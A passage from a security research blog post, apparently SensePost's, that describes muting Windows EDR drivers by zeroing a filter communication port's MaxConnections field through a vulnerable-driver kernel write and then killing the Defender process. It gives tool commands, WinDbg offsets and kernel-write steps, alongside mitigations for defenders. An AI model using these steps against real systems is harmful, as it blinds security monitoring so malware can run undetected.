src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_snowblast_mute.png\" alt=\"\" class=\"wp-image-68344\"></a></figure>\n\n\n\n<p>With knowledge of the <em>MaxConnections</em> memory location, we can use a kernel-mode read primitive to get the current value, and using a kernel-mode write primitive we can set the value to 0. </p>\n\n\n\n<h2 class=\"wp-block-heading has-larger-font-size\"><strong>Step 2: force EDR to restart</strong></h2>\n\n\n\n<p>This phase could be difficult because EDR_Process.exe does its utmost to protect itself. Usually this program is started as a service and it will respawn after it dies but we don&#x2019;t care since no connection is allowed by EDR_Driver.sys thanks to step 1 ;-)</p>\n\n\n\n<p>Personally I do this operation using a my own tool (unsigned evil driver) which allows us to kill a process even if it&#x2019;s protected, but it&#x2019;s also possible to use Process Hacker (if not denylisted) or even better any exploitable &#x201C;process killer drivers&#x201D;. I highly recommend the blogpost by Alice Climent-Pommeret (<a href=\"https://twitter.com/AliceCliment\" target=\"_blank\" rel=\"noreferrer noopener\">@AliceCliment</a>) <a href=\"https://alice.climent-pommeret.red/posts/process-killer-driver/\" target=\"_blank\" rel=\"noreferrer noopener\">Finding and exploiting process killer drivers with LOL for 3000$</a> which covers this topic!</p>\n\n\n\n<h2 class=\"wp-block-heading has-larger-font-size\"><strong>Step 3: observe EDR behaviour</strong></h2>\n\n\n\n<p>Let&#x2019;s create a malware (code base available on <a href=\"https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber\" target=\"_blank\" rel=\"noreferrer noopener\">ired.team</a>) named `<em>iwanttobeflag.exe</em>` that will trigger Windows Defender:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/iwanttobeflag.png\"><img loading=\"lazy\" decoding=\"async\" width=\"882\" height=\"681\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/iwanttobeflag.png\" alt=\"\" class=\"wp-image-68345\"></a></figure></div>\n\n\n<p>We can then test the default reaction to our malware by copying the malicious payload from a share to the local disk. This raises an alert and is blocked by Windows Defender as expected: great!</p>\n\n\n\n<pre id=\"block-a82340d4-ff09-4008-ad51-a1d4974c7448\" class=\"wp-block-code\"><code>copy z:\\iwanttobeflag.exe c:\\</code></pre>\n\n\n\n<p>Now we have something that would in general cause an alert that we can use to test if our technique mutes the EDR. Using this we can test if our &#x201C;filter-mute technique&#x201D; could be useful. </p>\n\n\n\n<h2 class=\"wp-block-heading has-larger-font-size\">Implementing the Plan</h2>\n\n\n\n<p>Lets put this all together into a tool and test if our steps 1 and 2 can disrupt the alert caused in step 3.</p>\n\n\n\n<p>I love the <a href=\"https://github.com/wavestone-cdt/EDRSandblast/\" target=\"_blank\" rel=\"noreferrer noopener\">EDRSandblast</a> tool made by Thomas DIOT (<a href=\"https://qazeer.io/\" target=\"_blank\" rel=\"noreferrer noopener\">Qazeer</a>) and Maxime MEIGNAN (<a href=\"https://twitter.com/th3m4ks\" target=\"_blank\" rel=\"noreferrer noopener\">@th3m4ks</a>), it&#x2019;s really amazing. I opened a <a href=\"https://github.com/wavestone-cdt/EDRSandblast/pulls?q=is%3Apr+author%3Av1k1ngfr\" target=\"_blank\" rel=\"noreferrer noopener\">pull requests</a> / <a href=\"https://github.com/wavestone-cdt/EDRSandblast/issues?q=is%3Aissue+author%3Av1k1ngfr\" target=\"_blank\" rel=\"noreferrer noopener\">issue</a> but I don&#x2019;t know if the project is maintained. This led me to starting my own project named <a href=\"https://github.com/Orange-Cyberdefense/EDRSnowblast\" target=\"_blank\" rel=\"noreferrer noopener\">EDRSnowblast</a> in order to implement this &#x201C;<em>minifilter driver mute technique</em>&#x201C;. More details on this project is available at <a href=\"https://v1k1ngfr.github.io/edrsnowblast/\" target=\"_blank\" rel=\"noreferrer noopener\">https://v1k1ngfr.github.io/edrsnowblast/</a>.</p>\n\n\n\n<p>Lets walk through the steps on a live machine and see what happens!</p>\n\n\n\n<p>1. enumerate drivers (filters) which are loaded in the kernel memory and identify Windows Defender : <em>WdFilter</em> at index 9 in the figure below</p>\n\n\n\n<pre class=\"wp-block-code\"><code>EDRSnowblast.exe filter-enum --kernelmode</code></pre>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_snowblast_mute1.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"387\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_snowblast_mute1-1024x387.png\" alt=\"\" class=\"wp-image-70170\"></a></figure></div>\n\n\n<p>2. retrieve details on <em>WdFilter</em> filter: for example <em>MaxConnections</em> &amp; <em>NumberOfConnections</em></p>\n\n\n\n<pre class=\"wp-block-code\"><code>EDRSnowblast.exe filter-enum --kernelmode --filter-index 9</code></pre>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_snowblast_mute2.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"776\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_snowblast_mute2-1024x776.png\" alt=\"\" class=\"wp-image-70172\"></a></figure></div>\n\n\n<p>3. mute <em>WdFilter</em>: set <em>MaxConnections</em> to zero</p>\n\n\n\n<pre class=\"wp-block-code\"><code>EDRSnowblast.exe filter-mute --kernelmode --filter-index 9</code></pre>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_snowblast_mute3.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"353\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_snowblast_mute3-1024x353.png\" alt=\"\" class=\"wp-image-70175\"></a></figure></div>\n\n\n<p>4. (optional) verify <em>MaxConnections</em> value using the <em>&#x2013;filter-enum</em> option as seen previously</p>\n\n\n\n<p>5. identify the PID of Windows Defender usermode process and kill it</p>\n\n\n\n<pre class=\"wp-block-code\"><code>tasklist | findstr MsMpEng.exe\nMsMpEng.exe                   2956 Services                   0    206,788 K\nc:\\pimpmypid_clt.exe /kill 2956</code></pre>\n\n\n\n<p>6. copy our malicious payload created in step 3 and execute</p>\n\n\n\n<pre class=\"wp-block-code\"><code>copy z:\\iwanttobeflag.exe c:\\\nc:\\iwanttobeflag.exe</code></pre>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/iwanttobeflag_exec.png\"><img loading=\"lazy\" decoding=\"async\" width=\"528\" height=\"284\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/iwanttobeflag_exec.png\" alt=\"\" class=\"wp-image-68349\"></a></figure></div>\n\n\n<p>7. bask in our success</p>\n\n\n\n<p>If you prefer, you can watch the live demo video below.</p>\n\n\n\n<iframe loading=\"lazy\" width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/PakPq-83IEE?si=b1RVjNjXhhLBQRpW\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n\n\n<p>This technique was successfully tested against Windows Defender and two other EDR vendors. </p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>How to protect / detect ?</strong></h2>\n\n\n\n<p>We must start by asking <strong>what are the &#x201C;filter-mute&#x201D; pre-requisites ?</strong></p>\n\n\n\n<ol>\n<li>you must use a Windows kernel R/W exploit primitive &#x2013; if you want to use BYOVD (Bring Your Own Vulnerable Driver) you must have <mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000\" class=\"has-inline-color\">SeLoadDriverPrivilege</mark>, necessary for loading / unloading drivers (ex: local administrator, domain admin, domain print operator)</li>\n\n\n\n<li>you must be able to kill (or restart) the EDR usermode application</li>\n</ol>\n\n\n\n<p>Now we could wonder if <strong>is it possible for Windows users to protect themselves?</strong> and yes some mitigations exist. Here are some recommendations:</p>\n\n\n\n<ul>\n<li><strong>apply Windows patches</strong>: it removes vulnerabilities from Windows kernel &amp; drivers</li>\n\n\n\n<li><strong>use Microsoft VBS</strong> (enable HVCI): as you may have noticed, the attack vector used is BYOVD. This vector has been known for a long time and Microsoft did a great job to mitigate this with virtualization-based security (VBS) features available in Windows 10, Windows 11, Windows Server 2016, and later. More details on VBS in the Microsoft documentation: <a href=\"https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs\" target=\"_blank\" rel=\"noreferrer noopener\">Virtualization-based Security (VBS)</a></li>\n\n\n\n<li><strong>use Microsoft recommended driver block rules</strong> <a href=\"https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules\" target=\"_blank\" rel=\"noreferrer noopener\">available here</a></li>\n\n\n\n<li><strong>use Sysmon or Sigma rules</strong>: a huge list of known-vulnerable drivers is available on <a href=\"https://www.loldrivers.io/\" target=\"_blank\" rel=\"noreferrer noopener\">www.loldrivers.io</a> and this project provides those kind of rules</li>\n</ul>\n\n\n\n<p>Another question is: <strong>Can EDR vendors protect their drivers against this attack?</strong> Yes they can! </p>\n\n\n\n<p>The fastest solution could be denylisting known-vulnerable drivers, avoiding them to be loaded. But this method has the same limitations as AV signatures; unknown vulnerable drivers won&#x2019;t be blocked. </p>\n\n\n\n<p>Better protections could be implemented by developers:</p>\n\n\n\n<ul>\n<li>always verify that EDR_process.exe is able to connect to EDR_driver.sys communication port. An example of code that could achieve this: </li>\n</ul>\n\n\n\n<pre class=\"wp-block-code\"><code>HANDLE hPort;\nHRESULT hr = ::FilterConnectCommunicationPort(L&quot;\\\\secureEDR&quot;,0, nullptr, 0, nullptr, &amp;hPort);\n\nif (FAILED(hr)) {\n   printf(&quot;Error connecting to EDR_driver.sys ! (HR=0x%08X)\\n&quot;, hr);\n   if (hr == 0x800704D6) {\n      printf(&quot;ERROR_CONNECTION_COUNT_LIMIT : A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.\\n&quot;);\n   }\n}\n// Other common errors you should check are\n// ERROR_BAD_PATHNAME (HR=0x800700A1)\n// E_FILE_NOT_FOUND (HR=0x80070002)\n// E_ACCESSDENIED (HR=0x80070005)\n// ERROR_INVALID_NAME (HR=0x8007007B)</code></pre>\n\n\n\n<ul>\n<li>Static KDP: an EDR driver should call the MmProtectDriverSection API for protecting a section of its image</li>\n\n\n\n<li>Dynamic KDP: allows a driver to allocate and initialise read-only memory using services provided by a secure pool, which is managed by the secure kernel, using ExAllocatePool3 API.</li>\n</ul>\n\n\n\n<p>More details on KDP in the post from Andrea Allievi: <a href=\"https://www.microsoft.com/en-us/security/blog/2020/07/08/\" target=\"_blank\" rel=\"noreferrer noopener\">Introducing Kernel Data Protection</a></p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Resources and acknowledgments</strong></h2>\n\n\n\n<p>I would like to give you the most relevant resources used during this journey and also thanks those people helping this research to be easier.</p>\n\n\n\n<p>Thank you for sharing your knowledge with the community!</p>\n\n\n\n<div class=\"wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-1 wp-block-group-is-layout-flex\">\n<p>&#x2013; Yarden Shafir (@yarden_shafir) for the blog &#x2013; <a href=\"https://windows-internals.com/investigating-filter-communication-ports/\" target=\"_blank\" rel=\"noreferrer noopener\">Investigating Filter Communication Ports</a></p>\n\n\n\n<p>&#x2013; Christopher Vella (@kharosx0) for the talk &#x2013; <a href=\"https://www.youtube.com/watch?v=85H4RvPGIX4\" target=\"_blank\" rel=\"noreferrer noopener\">CrikeyCon 2019 talk &#x2013; Reversing &amp; bypassing EDRs</a></p>\n\n\n\n<p>&#x2013; Zach Stein (@synzack21) for the blog &#x2013; <a href=\"https://synzack.github.io/Blinding-EDR-On-Windows/\" target=\"_blank\" rel=\"noreferrer noopener\">Blinding EDR On Windows</a></p>\n\n\n\n<p>&#x2013; Alexandre Borges (@ale_sp_brazil) for the 109 pages (!) &#x2013; <a href=\"https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/\" target=\"_blank\" rel=\"noreferrer noopener\">Exploiting Reversing (ER) series</a></p>\n\n\n\n<p>&#x2013; Pavel Yosifovich (@zodiacon) for the book &#x2013; <a href=\"https://leanpub.com/windowskernelprogramming\" target=\"_blank\" rel=\"noreferrer noopener\">Windows Kernel Programming</a></p>\n\n\n\n<p>&#x2013; Alex Ionescu (@aionescu) for the talks &#x2013; <a href=\"https://www.youtube.com/watch?v=5HbmpPBKVFg\" target=\"_blank\" rel=\"noreferrer noopener\">REcon 2013 &#x2013; I got 99 problems but a kernel pointer ain&#x2019;t one</a></p>\n\n\n\n<p>&#x2013; Connor McGarr (@33y0re) for the blog &#x2013; <a href=\"https://connormcgarr.github.io/hvci/\" target=\"_blank\" rel=\"noreferrer noopener\">Exploit Development: No Code Execution? No Problem! Living The Age of VBS, HVCI, and Kernel CFG</a></p>\n</div>\n\n\n\n<p>I hope you learnt something, thanks for reading!</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>EXTRA MILE: &#x201C;kernel walking, 10 steps to get access to MaxConnections&#x201D;</strong></h2>\n\n\n\n<p>Alright you&#x2019;re curious, the hacker spirit is great! Want to know how to get MaxConnections value? The method below shows how to get the MaxConnections value of the driver named <mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000\" class=\"has-inline-color\">bindflt.sys</mark> using Windbg. As a reminder / help, please find the hiking map below.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/FLT_all_simplified.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"283\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/FLT_all_simplified-1024x283.png\" alt=\"\" class=\"wp-image-68343\"></a></figure></div>\n\n\n<p>TL;DR: the full solution is available in the map at the end of this section</p>\n\n\n\n<p><strong>Step 0 &#x2013; Identify the entry point</strong></p>\n\n\n\n<p>The starting point is the structure named FLTMGR!FltGlobals. You can get the address directly:</p>\n\n\n\n<p><code>kd&gt; ? FLTMGR!FltGlobals</code></p>\n\n\n\n<p>But if you need to retrieve this address using a memory leak, this path works like a charm:</p>\n\n\n\n<p>&#x2013; get fltmgr.sys start address</p>\n\n\n\n<p><code>lmdvm fltmgr</code></p>\n\n\n\n<p>&#x2013; get FltEnumerateFilters function offset, and in this function the offset of <code>lea rcx, [FLTMGR!FltGlobals+0x58]</code> instruction</p>\n\n\n\n<p><code>u FLTMGR!FltEnumerateFilters L15</code></p>\n\n\n\n<p>&#x2013; compute FLTMGR!FltGlobals start address: <code>0xfffff8061ea8b600</code></p>\n\n\n\n<p><code>? fffff806`1ea8b658 - 0x58</code></p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/extraMile1.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"738\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/extraMile1.png\" alt=\"\" class=\"wp-image-68351\"></a></figure></div>\n\n\n<p><strong>Step 1 &#x2013; compute the FrameList field address stored in FLTMGR!FltGlobals: 0xfffff8061ea8b6c0</strong></p>\n\n\n\n<p><code>kd&gt; ? fffff806`1ea8b600 + 0x58 + 0x68</code></p>\n\n\n\n<p><strong>Step 2 &#x2013; use pointer indirection and get the first frame (Links filed) address in FLTMGR!_FLTP_FRAME: 0xffffca0c38c61058</strong></p>\n\n\n\n<p><code>kd&gt; ? poi(fffff806`1ea8b6c0)</code></p>\n\n\n\n<p><strong>Step 3 &#x2013; compute the First frame start address: 0xffffca0c38c61050</strong></p>\n\n\n\n<p><code>kd&gt; ? ffffca0c`38c61058 - 0x008</code></p>\n\n\n\n<p><strong>Step 4 &#x2013; compute the Filter List address: 0xffffca0c38c61100</strong></p>\n\n\n\n<p><code>kd&gt; ? ffffca0c`38c61050 + 0x48 + 0x68 + 0x000</code></p>\n\n\n\n<p><strong>Step 5 &#x2013; use pointer indirection and get the First filter (PrimaryLink field) address: 0xffffca0c386e8020</strong></p>\n\n\n\n<p><code>kd&gt; ? poi(ffffca0c`38c61100)</code></p>\n\n\n\n<p><strong>Step 6 &#x2013; compute the First filter address (Base of FLTMGR!_FLT_FILTER): 0xffffca0c386e8010</strong></p>\n\n\n\n<p><code>kd&gt; ? ffffca0c`386e8020 - 0x010</code></p>\n\n\n\n<p>Ok nice we can verify and visualize where we are using Windbg filter kernel debugger (fltkd) command named <strong>frames</strong>:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/extraMile2.png\"><img loading=\"lazy\" decoding=\"async\" width=\"539\" height=\"197\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/extraMile2.png\" alt=\"\" class=\"wp-image-68355\"></a></figure></div>\n\n\n<p><strong>Step 7 &#x2013; compute the Server Ports List address: 0xffffca0c386e8250</strong></p>\n\n\n\n<p><code>kd&gt; ? ffffca0c`386e8010 + 0x208 + 0x038 + 0x000</code></p>\n\n\n\n<p><strong>Step 8 &#x2013; use pointer indirection and get the First Server Ports Object address (FLTMGR!_FLT_SERVER_PORT_OBJECT FilterLink address): 0xffffca0c3eaf73f0</strong></p>\n\n\n\n<p><code>kd&gt; ? poi(ffffca0c`386e8250)</code></p>\n\n\n\n<p><strong>Step 9 &#x2013; compute the MaxConnections field address: 0xffffca0c3eaf7430</strong></p>\n\n\n\n<p><code>kd&gt; ? ffffca0c`3eaf73f0 +0x040</code></p>\n\n\n\n<p><strong>Step 10 &#x2013; use pointer indirection and get the MaxConnections value: 1000</strong></p>\n\n\n\n<p><code>kd&gt; .formats poi(ffffca0c`3eaf7430)</code></p>\n\n\n\n<p>or</p>\n\n\n\n<p><code>kd&gt; dt _FLT_SERVER_PORT_OBJECT ffffca0c`3eaf73f0</code></p>\n\n\n\n<p>Finally! You got it!</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/extraMile4.png\"><img loading=\"lazy\" decoding=\"async\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/extraMile4.png\" alt=\"\" class=\"wp-image-68356\" style=\"width:610px;height:328px\" width=\"610\" height=\"328\"></a></figure></div>\n\n\n<p><strong>Final steps &#x2013; set the MaxConnections value to zero and kill EDR_Process.exe</strong></p>\n\n\n\n<p><code>kd&gt; eq 0xffffca0c3eaf7430 0</code></p>\n\n\n\n<p>and</p>\n\n\n\n<p><code>kd&gt; !process 0 0 MsMpEng.exe</code><br><code>PROCESS ffffa40a23a5f340</code></p>\n\n\n\n<p><code>kd&gt; .kill ffffa40a23a5f340</code></p>\n\n\n\n<p>Because it was a nightmare for me to visualise where I am in kernel memory, what are the fields of the data structures, the links between data structures, what offsets should I use, etc I made the map below (which also includes Windbg commands).</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/viking_winkern_walking_FLT.drawio-1.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"350\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/viking_winkern_walking_FLT.drawio-1-1024x350.png\" alt=\"\" class=\"wp-image-70247\"></a></figure>\n\n\n\n<p>Maybe (as I did) are you wondering what are those values used in computations: yes those are <strong>offsets</strong>. </p>\n\n\n\n<p>Offsets could change after Windows updates, personally I use a customised version of EDRSandblast&#x2019;s <em>ExtractOffsets.py</em> script (available in <a href=\"https://github.com/Orange-Cyberdefense/EDRSnowblast\" target=\"_blank\" rel=\"noreferrer noopener\">EDRSnowblast</a>). Output example is shown below.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/extraMile3.png\"><img loading=\"lazy\" decoding=\"async\" width=\"892\" height=\"704\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/extraMile3.png\" alt=\"\" class=\"wp-image-68361\"></a></figure></div>\n\n\n<p>Because we know the method and the offsets, we can automate this! PoC or GTFO, the code to do so can be found at <strong><em><a href=\"https://github.com/Orange-Cyberdefense/EDRSnowblast/blob/9953229180d3cc54132a374f42c6d977582be9ab/EDRSandblast/Utils/FltmgrOffsets.c#L167\" target=\"_blank\" rel=\"noreferrer noopener\">EDRSnowblast</a></em></strong>.</p>\n\n\n\n<p>Happy hacking!</p>\n",
      "content:encodedSnippet": "For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a look at communication between a Windows driver and its user-mode process. Here are some details about that journey.\nTL;DR\nAttackers could use Windows kernel R/W exploit primitive to avoid communication between EDR_Driver.sys and its EDR_process.exe. As a result some EDR detection mechanisms will be disabled and make it (partially) blind to malicious payloads. This blogpost describes an alternative approach which doesn’t remove kernel callbacks and gives some recommendations for protecting against this “filter-mute” attack.\nOverview of EDR_process.exe and EDR_Driver.sys roles\nThe first question that comes to mind is how does a EDR application (EDR_Process.exe) communicate with its EDR driver (EDR_Driver.sys)?\nBefore doing research we must know some EDR basics; how does an EDR agent hook / inject its own DLL during process creation?\nThe Process Injection via Callbacks schemas taken from EDR Observations made by Christopher Vella is a good summary.\n\nI have added some comments on what’s happening:\nEDR_Driver.sys can subscribe to several kinds of kernel notifications. You can imagine those notifications are like “newsletters” you subscribe to on the Internet and receive by email from a website. For example EDR_Driver.sys could subscribe to the “new process creation” notification service using the Windows API named PsSetCreateProcessNotifyRoutine which then, for each process created by the system, the driver will receive information about it (parent PID, command line, etc)\nThe user double-clicks on malware.exe\nWindows calls the CreateProcessW API in order to load malware.exe into memory\nEDR_Driver.sys is notified that malware.exe **will be** spawned.\nEDR_Driver.sys sends a log to EDR_Process.exe saying “Hey! A new process called malware.exe will be started soon.”\nEDR_process.exe can choose to take action (or not): “Ok I will monitor this process by creating hooks in its ntdll.dll”\nWhen malware.exe runs, it calls the Windows API. Thanks to the hooks in place, EDR_Process.exe knows which APIs are called and can deduce what this malware.exe is doing\nWe could take the piece of code below from ired.team as an example of malware.exe.\n\n\n\n\nOnce hooks are in place, the EDR agent (EDR_process.exe) can monitor / analyse malware.exe. Here is an example of actions it could take:\n1. EDR_Process.exe sees the following Windows API calls that are called by malware.exe:\nOpenProcess\nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\n2. EDR_Process.exe classifies this API call sequence as “malicious” and blocks (kills) the process.\n3. EDR_Process.exe sends a log to the EDR_C2 (security console) saying “Hey, malware.exe process spawned and is classified as malicious”.\nNote: this is a common EDR flow and not the only way it could work, for example EDR_Process.exe may only send telemetry data and let the EDR_C2 decide if it’s malicious and the action to be applied (block or not).\nIf the EDR vendor or the security team operators (aka blueteam) configured a “block if malicious” rule in the EDR Security Console then the malware.exe process is killed by EDR_Process.exe (or EDR_Driver.sys). Other countermeasures are also available, for example:\nthe Windows host could be remotely isolated from the network\nmalware.exe file or memory dump could be downloaded for analysis / reversing\nsecurity analyst could run commands on the Windows host (from the security console) for investigation purpose\n…\nThis point is an important one; the more experienced the blueteam is in creating custom rules, the more difficult for attackers to evade or move laterally into the network without being caught!\nNow before digging into internal communication, I want to take a step back and simplify the EDR behaviour. Internal communication (blue arrows) and external communication (yellow arrows) of the EDR_Process.exe could be visualised with a simple overview:\n\nDigging into EDR internal communication\nFrom Windows kernel memory space, EDR_Driver.sys could use several Windows Kernel API’s (callbacks) to monitor and then block the malicious system activities. For example the API PsSetCreateProcessNotifyRoutine routine could be used to generate the following “monitoring logs” messages thanks to the kernel callback mechanism:\n– Log = new process created (PID 5376) with cmd Line C:\\notepad.exe\nFrom usermode memory space, EDR_Process.exe could send action requests to the driver and receive information from it. For example an “Action request” coming from EDR security console could be:\n– Action = denylist C:\\notepad.exe\nIn the figure below I tried to map common Windows Kernel callbacks used for monitoring purposes.\n\nThe question which comes to mind after making this summary was how to avoid communication between EDR_process.exe and EDR_driver.sys?\nBlinding EDR using known techniques\nThe most common techniques for blinding EDR sensors are:\nRemoving the DLL hooks (userland)\nRemoving the kernel callbacks (kernel land)\nBecause we only focus on kernel part of EDR, here is a visualisation on what happens when you remove kernel callbacks:\nBEFORE zero out of the EDR callback address:\n\n\n\n\nAFTER zero out of the EDR callback address:\n\n\n\n\nWe won’t go into details on this topic, it’s covered in the blogpost Blinding EDR On Windows from Zach Stein.\nBut you may notice in the figure below that each time you zero out the EDR callback address it means no more notifications (no “newsletter”) will be sent from Windows to EDR_Driver.sys. In the end, no event log will be sent to EDR_Process.exe (and security analyst console) anymore!\n\nBlinding EDR using an alternative approach\nDuring my research on this topic I was wondering how to avoid communication between EDR_process.exe and EDR_driver.sys without any callback modification ? Could we prevent EDR_process.exe and EDR_Driver.sys from exchanging “messages”?\nLike I said before, we want to stay on the kernel side of the story. We could imagine this other approach using this graphical representation:\n\nWhile I was trying to investigate using Windbg, Yarden Shafir wrote an awesome blog on Investigating Filter Communication Ports which really helped. I discovered some Windows data structures being manipulated during communication setup between an application and a driver.\nThe data structure named FLT_SERVER_PORT_OBJECT drew my attention because it seemed to contain interesting fields, see if you agree:\n\nWhen I saw this, the first question which came to my mind was what could happen if we set MaxConnections to zero?\nThis data structure is initialised using the Windows Drivers API named FltCreateCommunicationPort:\nNTSTATUS FLTAPI FltCreateCommunicationPort(\n  [in]           PFLT_FILTER            Filter,\n  [out]          PFLT_PORT              *ServerPort,\n  [in]           POBJECT_ATTRIBUTES     ObjectAttributes,\n  [in, optional] PVOID                  ServerPortCookie,\n  [in]           PFLT_CONNECT_NOTIFY    ConnectNotifyCallback,\n  [in]           PFLT_DISCONNECT_NOTIFY DisconnectNotifyCallback,\n  [in, optional] PFLT_MESSAGE_NOTIFY    MessageNotifyCallback,\n  [in]           LONG                   MaxConnections\n);\nMicrosoft documentation gives the following information:\n\n\n\n\nWhat could we deduce? If we are able to reset MaxConnections to zero, it will only prevent new connections from happening. Let’s go for the following attack plan:\nStep 1: reset MaxConnections value\nStep 2: force EDR_Process.exe to restart (should require high privileges, probably NT SYSTEM)\nStep 3: observe EDR behaviour\nStep 1: reset MaxConnections value\nThe first prerequisite for this step is to have a kernel-mode read / write primitive that we can use to set the value to 0. We will use BYOVD (Bring Your Own Vulnerable Driver) technique for this. As a second prerequisite we have to find the address of MaxConnections field in kernel memory right? Let’s take a look at how we can get this address!\nThe structure fltmgr!_FLT_SERVER_PORT_OBJECT we discussed previously could be reached by the structure fltmgr!_FLT_FILTER, which could be reached by the structure fltmgr!_FLTP_FRAME, which could be reached by the structure FLTMGR!_GLOBALS, which could be reached by the FltMgr.sys driver. The base address of this kernel module can be retrieved from userland using NtQuerySystemInformation Windows API.\nI agree with Alex Ionescu when he said “I got 99 problems but a kernel pointer ain’t one” :-). We can find MaxConnections address by walking through Windows kernel data structures, starting from FltMgr.sys driver up to this field!\n\nThis is a bit long for the middle of the blogpost, but if you’re curious and want to know how to do this using Windbg, check out the EXTRA MILE section at the end: “kernel walking, 10 steps to get access to MaxConnections”\nHere is what it looks like when you want to have a look at details concerning Windows Defender kernel driver:\n\n\n\n\nWith knowledge of the MaxConnections memory location, we can use a kernel-mode read primitive to get the current value, and using a kernel-mode write primitive we can set the value to 0. \nStep 2: force EDR to restart\nThis phase could be difficult because EDR_Process.exe does its utmost to protect itself. Usually this program is started as a service and it will respawn after it dies but we don’t care since no connection is allowed by EDR_Driver.sys thanks to step 1 ;-)\nPersonally I do this operation using a my own tool (unsigned evil driver) which allows us to kill a process even if it’s protected, but it’s also possible to use Process Hacker (if not denylisted) or even better any exploitable “process killer drivers”. I highly recommend the blogpost by Alice Climent-Pommeret (@AliceCliment) Finding and exploiting process killer drivers with LOL for 3000$ which covers this topic!\nStep 3: observe EDR behaviour\nLet’s create a malware (code base available on ired.team) named `iwanttobeflag.exe` that will trigger Windows Defender:\n\nWe can then test the default reaction to our malware by copying the malicious payload from a share to the local disk. This raises an alert and is blocked by Windows Defender as expected: great!\ncopy z:\\iwanttobeflag.exe c:\\\nNow we have something that would in general cause an alert that we can use to test if our technique mutes the EDR. Using this we can test if our “filter-mute technique” could be useful. \nImplementing the Plan\nLets put this all together into a tool and test if our steps 1 and 2 can disrupt the alert caused in step 3.\nI love the EDRSandblast tool made by Thomas DIOT (Qazeer) and Maxime MEIGNAN (@th3m4ks), it’s really amazing. I opened a pull requests / issue but I don’t know if the project is maintained. This led me to starting my own project named EDRSnowblast in order to implement this “minifilter driver mute technique“. More details on this project is available at https://v1k1ngfr.github.io/edrsnowblast/.\nLets walk through the steps on a live machine and see what happens!\n1. enumerate drivers (filters) which are loaded in the kernel memory and identify Windows Defender : WdFilter at index 9 in the figure below\nEDRSnowblast.exe filter-enum --kernelmode\n\n2. retrieve details on WdFilter filter: for example MaxConnections & NumberOfConnections\nEDRSnowblast.exe filter-enum --kernelmode --filter-index 9\n\n3. mute WdFilter: set MaxConnections to 